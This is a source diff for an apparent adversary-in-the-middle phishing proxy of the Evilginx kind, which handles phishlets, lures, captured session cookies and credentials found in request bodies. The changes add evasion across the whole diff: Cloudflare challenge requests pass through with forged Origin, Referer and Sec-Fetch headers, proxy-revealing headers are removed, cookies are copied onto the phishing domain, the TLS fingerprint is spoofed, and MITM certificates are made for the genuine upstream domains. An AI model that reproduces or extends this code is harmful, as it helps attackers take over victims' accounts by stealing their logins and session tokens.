@@ -265,12 +265,23 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// DEBUG: Check if ClientHelloSpec is available
 			if ctx.ClientHelloSpec != nil {
 				log.Debug("DoFunc: ClientHelloSpec captured - will use for upstream TLS")
-				// Override RoundTripper to use ClientHelloSpec for upstream TLS
-				ctx.RoundTripper = goproxy.RoundTripperFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Response, error) {
-					// Create custom TLS transport with ClientHelloSpec
-					tr := createCustomUTLSTransport(ctx.ClientHelloSpec)
-					return tr.RoundTrip(req)
-				})
+
+				// Skip custom transport for WebSocket connections
+				// Let goproxy handle WebSocket natively
+				isWebSocket := strings.EqualFold(req.Header.Get("Upgrade"), "websocket") &&
+					strings.Contains(strings.ToLower(req.Header.Get("Connection")), "upgrade")
+
+				if !isWebSocket {
+					// Override RoundTripper to use ClientHelloSpec for upstream TLS
+					ctx.RoundTripper = goproxy.RoundTripperFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Response, error) {
+						// Create custom TLS transport with ClientHelloSpec
+						tr := createCustomUTLSTransport(ctx.ClientHelloSpec)
+						return tr.RoundTrip(req)
+					})
+					log.Debug("DoFunc: Custom transport set for non-WebSocket request")
+				} else {
+					log.Debug("DoFunc: WebSocket request detected - using default goproxy routing")
+				}
 			} else {
 				log.Debug("DoFunc: ClientHelloSpec is NIL - no fingerprint available")
 			}
@@ -724,18 +735,93 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				// replace "Host" header
-				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
-					req.Host = r_host
-				}
+				// Special handling for Cloudflare challenge requests - route to challenges.cloudflare.com
+				if strings.Contains(req.URL.Path, "/cdn-cgi/challenge") {
+					log.Debug("Cloudflare challenge request detected: %s %s", req.Method, req.URL.Path)
+					log.Debug("  Content-Type: %s", req.Header.Get("Content-Type"))
+					log.Debug("  Content-Length: %s", req.Header.Get("Content-Length"))
+					log.Debug("  Cookie count: %d", len(req.Cookies()))
 
-				// fix origin
-				origin := req.Header.Get("Origin")
-				if origin != "" {
-					if o_url, err := url.Parse(origin); err == nil {
-						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
-							o_url.Host = r_host
-							req.Header.Set("Origin", o_url.String())
+					req.Host = "challenges.cloudflare.com"
+					req.URL.Host = "challenges.cloudflare.com"
+					req.URL.Scheme = "https"
+
+					// Fix Origin header to match the Cloudflare domain BEFORE logging
+					origin := req.Header.Get("Origin")
+					if origin != "" {
+						req.Header.Set("Origin", "https://challenges.cloudflare.com")
+						log.Debug("  Fixed Origin to: https://challenges.cloudflare.com")
+					}
+
+					// For Cloudflare challenges, always set Referer to Cloudflare origin
+					// Cloudflare validates that Referer is from the expected origin
+					req.Header.Set("Referer", "https://challenges.cloudflare.com/")
+					log.Debug("  Set Referer to: https://challenges.cloudflare.com/")
+
+					// Fix Sec-Fetch-Site to cross-site since we're accessing a different domain BEFORE logging
+					if req.Header.Get("Sec-Fetch-Site") != "" {
+						req.Header.Set("Sec-Fetch-Site", "cross-site")
+						log.Debug("  Fixed Sec-Fetch-Site to: cross-site")
+					}
+
+					// Remove any proxy-related headers that might confuse Cloudflare
+					req.Header.Del("Via")
+					req.Header.Del("X-Forwarded-For")
+					req.Header.Del("X-Forwarded-Host")
+					req.Header.Del("X-Forwarded-Proto")
+					req.Header.Del("X-Real-IP")
+					req.Header.Del("Proxy-Connection")
+					log.Debug("  Removed proxy-related headers")
+
+					// For POST requests specifically, ensure Sec-Fetch-Mode is appropriate
+					// POST with body needs cors mode, not no-cors
+					if req.Method == "POST" {
+						if req.Header.Get("Sec-Fetch-Mode") != "" {
+							req.Header.Set("Sec-Fetch-Mode", "cors")
+							log.Debug("  Changed Sec-Fetch-Mode to: cors")
+						}
+					}
+
+					// Log all headers being sent (after fixing them)
+					log.Debug("  Headers being sent (after fixes):")
+					for k, vv := range req.Header {
+						for _, v := range vv {
+							if k == "Cookie" {
+								log.Debug("    %s: [%d bytes]", k, len(v))
+							} else if len(v) > 100 {
+								log.Debug("    %s: %s...", k, v[:100])
+							} else {
+								log.Debug("    %s: %s", k, v)
+							}
+						}
+					}
+
+					log.Debug("  URL path: %s, rawquery: %s", req.URL.Path, req.URL.RawQuery)
+				} else {
+					// replace "Host" header for normal requests
+					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
+						req.Host = r_host
+					}
+
+					// fix origin for normal requests
+					origin := req.Header.Get("Origin")
+					if origin != "" {
+						if o_url, err := url.Parse(origin); err == nil {
+							if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
+								o_url.Host = r_host
+								req.Header.Set("Origin", o_url.String())
+							}
+						}
+					}
+
+					// fix referer for normal requests
+					referer := req.Header.Get("Referer")
+					if referer != "" {
+						if o_url, err := url.Parse(referer); err == nil {
+							if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
+								o_url.Host = r_host
+								req.Header.Set("Referer", o_url.String())
+							}
 						}
 					}
 				}
@@ -751,19 +837,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				// fix referer
-				referer := req.Header.Get("Referer")
-				if referer != "" {
-					if o_url, err := url.Parse(referer); err == nil {
-						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
-							o_url.Host = r_host
-							req.Header.Set("Referer", o_url.String())
-						}
-					}
-				}
-
 				// patch GET query params with original domains
-				if pl != nil {
+				// Skip for Cloudflare challenges since we're forwarding directly to Cloudflare
+				if pl != nil && !strings.Contains(req.URL.Path, "/cdn-cgi/challenge") {
 					qs := req.URL.Query()
 					if len(qs) > 0 {
 						for gp := range qs {
@@ -776,7 +852,35 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 
 				// check for creds in request body
-				if pl != nil && ps.SessionId != "" {
+				// For Cloudflare challenges, read but don't modify the body
+				isCloudflareRequest := strings.Contains(req.URL.Path, "/cdn-cgi/challenge")
+
+				// For Cloudflare challenges, ensure body is properly preserved
+				if isCloudflareRequest {
+					body, err := ioutil.ReadAll(req.Body)
+					if err == nil {
+						req.Body = ioutil.NopCloser(bytes.NewBuffer(body))
+						req.ContentLength = int64(len(body))
+						log.Debug("Cloudflare POST body size: %d bytes", len(body))
+						if req.Method == "POST" && len(body) > 0 {
+							// Log first 2000 bytes of body for debugging
+							bodyPreview := body
+							if len(body) > 2000 {
+								bodyPreview = body[:2000]
+							}
+							log.Debug("Cloudflare POST body: %s", string(bodyPreview))
+							if len(body) > 2000 {
+								log.Debug("Cloudflare POST body (first 2000 bytes shown, total %d bytes)", len(body))
+							}
+						}
+					}
+
+					// Verify Host header is correctly set for Cloudflare
+					log.Debug("  Final request Host: %s", req.Host)
+					log.Debug("  Final request URL.Host: %s", req.URL.Host)
+					log.Debug("  Final request URL: %s", req.URL.String())
+				} else if pl != nil && ps.SessionId != "" {
+					// Skip body processing entirely for Cloudflare challenges - they need the exact original body
 					// req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
@@ -971,8 +1075,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				// check if request should be intercepted
-				if pl != nil {
+				// check if request should be intercepted - skip for Cloudflare challenges
+				if pl != nil && !isCloudflareRequest {
 					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
 						for _, ic := range pl.intercept {
 							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
@@ -984,7 +1088,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
+				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" && !isCloudflareRequest {
 					s, ok := p.sessions[ps.SessionId]
 					if ok && !s.IsDone {
 						for _, au := range pl.authUrls {
@@ -1007,19 +1111,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 			resp.Header.Set("Referrer-Policy", "no-referrer")
 			// handle session
-			ck := &http.Cookie{}
 			ps := ctx.UserData.(*ProxySession)
-			if ps.SessionId != "" {
-				if ps.Created {
-					ck = &http.Cookie{
-						Name:    getSessionCookieName(ps.PhishletName, p.cookieName),
-						Value:   ps.SessionId,
-						Path:    "/",
-						Domain:  p.cfg.GetBaseDomain(),
-						Expires: time.Now().Add(60 * time.Minute),
-					}
-				}
-			}
 
 			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
 			if allow_origin != "" && allow_origin != "*" {
@@ -1032,17 +1124,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 				resp.Header.Set("Access-Control-Allow-Credentials", "true")
 			}
-			var rm_headers = []string{
-				"Content-Security-Policy",
-				"Content-Security-Policy-Report-Only",
-				"Strict-Transport-Security",
-				"X-XSS-Protection",
-				"X-Content-Type-Options",
-				"X-Frame-Options",
-			}
-			for _, hdr := range rm_headers {
-				resp.Header.Del(hdr)
-			}
+			// var rm_headers = []string{
+			// 	"Content-Security-Policy",
+			// 	"Content-Security-Policy-Report-Only",
+			// 	"Strict-Transport-Security",
+			// 	"X-XSS-Protection",
+			// 	"X-Content-Type-Options",
+			// 	"X-Frame-Options",
+			// }
+			// for _, hdr := range rm_headers {
+			// 	resp.Header.Del(hdr)
+			// }
 
 			redirect_set := false
 			if s, ok := p.sessions[ps.SessionId]; ok {
@@ -1062,6 +1154,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
+			// Detect Cloudflare challenge paths early for special handling throughout response processing
+			isCloudflareChallenge := strings.Contains(resp.Request.URL.Path, "/cdn-cgi/challenge")
+
 			// fix cookies
 			pl := p.getPhishletByOrigHost(req_hostname)
 			var auth_tokens map[string][]*CookieAuthToken
@@ -1071,8 +1166,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			is_cookie_auth := false
 			is_body_auth := false
 			is_http_auth := false
+
 			cookies := resp.Cookies()
 			resp.Header.Del("Set-Cookie")
+
+			// Log cookie info for debugging
+			if isCloudflareChallenge {
+				log.Debug("Cloudflare response: extracting %d cookies", len(cookies))
+				for _, ck := range cookies {
+					log.Debug("  Cookie: name=%s, domain=%s, path=%s, value_len=%d", ck.Name, ck.Domain, ck.Path, len(ck.Value))
+				}
+			}
+
 			for _, ck := range cookies {
 				// parse cookie
 
@@ -1115,15 +1220,41 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
-				resp.Header.Add("Set-Cookie", ck.String())
-			}
-			if ck.String() != "" {
-				resp.Header.Add("Set-Cookie", ck.String())
+				// For Cloudflare challenges, set cookies with BOTH domains:
+				// 1. Original domain (challenges.cloudflare.com) for direct Cloudflare requests
+				// 2. Request/proxy domain (test.local) for proxy requests
+				// This ensures browser sends cookies in both scenarios
+				if isCloudflareChallenge {
+					log.Debug("Cloudflare: processing cookie %s, domain='%s', req_hostname='%s'", ck.Name, ck.Domain, req_hostname)
+					// Always set original domain cookie
+					resp.Header.Add("Set-Cookie", ck.String())
+
+					// Also set cookie for the proxy domain (request hostname) when different from original
+					if ck.Domain != "" && !strings.EqualFold(ck.Domain, req_hostname) && req_hostname != "" {
+						ckProxy := *ck
+						ckProxy.Domain = req_hostname
+						resp.Header.Add("Set-Cookie", ckProxy.String())
+						log.Debug("Cloudflare cookie dual-domain set: %s (orig) + %s (proxy)", ck.Domain, req_hostname)
+					} else if ck.Domain == "" {
+						log.Debug("Cloudflare: cookie has empty domain, not setting proxy version")
+					}
+				} else {
+					// Transform cookie domain to phishing domain for normal requests
+					ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
+					resp.Header.Add("Set-Cookie", ck.String())
+				}
 			}
 
 			// modify received body
 			body, err := ioutil.ReadAll(resp.Body)
+
+			// Log Cloudflare error responses for debugging
+			if isCloudflareChallenge && resp.StatusCode >= 400 {
+				log.Debug("Cloudflare error response: status=%d, body_size=%d", resp.StatusCode, len(body))
+				if len(body) > 0 && len(body) < 2000 {
+					log.Debug("  Response body: %s", string(body))
+				}
+			}
 
 			if pl != nil {
 				if s, ok := p.sessions[ps.SessionId]; ok {
@@ -1198,12 +1329,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
+
 			if err == nil {
 				for site, pl := range p.cfg.phishlets {
 					if p.cfg.IsSiteEnabled(site) {
 						// handle sub_filters
 						sfs, ok := pl.subfilters[req_hostname]
-						if ok {
+						if ok && !isCloudflareChallenge {
 							for _, sf := range sfs {
 								var param_ok bool = true
 								if s, ok := p.sessions[ps.SessionId]; ok {
@@ -1259,7 +1391,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 
 						// handle auto filters (if enabled)
-						if stringExists(mime, p.auto_filter_mimes) {
+						if stringExists(mime, p.auto_filter_mimes) && !isCloudflareChallenge {
 							for _, ph := range pl.proxyHosts {
 								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
 									if ph.auto_filter {
@@ -1268,13 +1400,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 						}
-						body = []byte(removeObfuscatedDots(string(body)))
+						if !isCloudflareChallenge {
+							body = []byte(removeObfuscatedDots(string(body)))
+						}
 					}
 				}
 
 				if stringExists(mime, []string{"text/html"}) {
 
-					if pl != nil && ps.SessionId != "" {
+					if pl != nil && ps.SessionId != "" && !isCloudflareChallenge {
 						s, ok := p.sessions[ps.SessionId]
 						if ok {
 							if s.PhishLure != nil {
@@ -1676,8 +1810,37 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 			log.Debug("TLSConfigFromCA: no ClientHelloSpec available, using default TLS")
 		}
 
+		// Try to find the phishlet and get the original domain
+		phish_host := ""
+		if pl := p.getPhishletByPhishHost(hostname); pl != nil {
+			// Get the phishing domain
+			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
+			if ok {
+				// Find the matching proxy host and get the original domain
+				for _, ph := range pl.proxyHosts {
+					phishingHost := combineHost(ph.phish_subdomain, phishDomain)
+					originalHost := combineHost(ph.orig_subdomain, ph.domain)
+
+					// Check if hostname matches the phishing domain
+					if hostname == phishingHost {
+						phish_host = originalHost
+						log.Debug("TLSConfigFromCA: found original domain %s for phishing domain %s", phish_host, hostname)
+						break
+					}
+					// Check if hostname matches the upstream domain (for MITM certificate generation)
+					if hostname == originalHost {
+						phish_host = originalHost
+						log.Debug("TLSConfigFromCA: found upstream domain %s, will use it for certificate", phish_host)
+						break
+					}
+				}
+			}
+		} else {
+			log.Debug("TLSConfigFromCA: phishlet not found for hostname %s, will use generic certificate", hostname)
+		}
+
 		// Get local self-signed certificate
-		utlsCert, err := p.crt_db.getSelfSignedCertificate(hostname, "", port)
+		utlsCert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
 		if err != nil {
 			log.Error("http_proxy: failed to get certificate for %s: %s", hostname, err)
 			return nil, err
@@ -1803,6 +1966,10 @@ func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
 			}
 			for _, ph := range pl.proxyHosts {
 				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
+					return pl
+				}
+				// Also check upstream hostname for MITM certificate generation
+				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
 					return pl
 				}
 			}
